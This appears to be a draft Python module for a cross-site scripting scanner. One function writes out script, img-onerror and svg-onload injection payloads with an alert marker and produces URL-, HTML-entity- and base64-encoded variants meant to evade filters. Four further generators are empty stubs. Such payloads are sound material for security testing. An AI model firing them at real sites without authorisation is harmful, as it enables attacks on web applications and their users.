'''
Not going to keep the requests in here. Just keepign it for testing
'''
from encoding import *
encoders = [url_encode,url_encode_plus,double_url_encode,html_entity_encode,html_escape,base64_encode,]

# TODO: HTML Data generator 
def generate_html_data_payloads(tag, marker):
    templates = [f"</{tag}><script>alert('{marker}')</script>",f"</{tag}><img src=x onerror=alert('{marker}')>",f"</{tag}><svg onload=alert('{marker}')>"]

    return templates + [enc(tpl) for tpl in templates for enc in encoders]

example = generate_html_data_payloads('a', 'z0f863')
print(len(example))

# TODO: Attribute generator (quotted and unquotted)
def generate_attribute_data_payloads():
    return None

# TODO: JS String Literal generator
def js_string_literal_data_generator():
    return None

# TODO: URL generator (href)
def url_data_generator():
    return None

# TODO: CSS generator
def css_data_generator():
    return None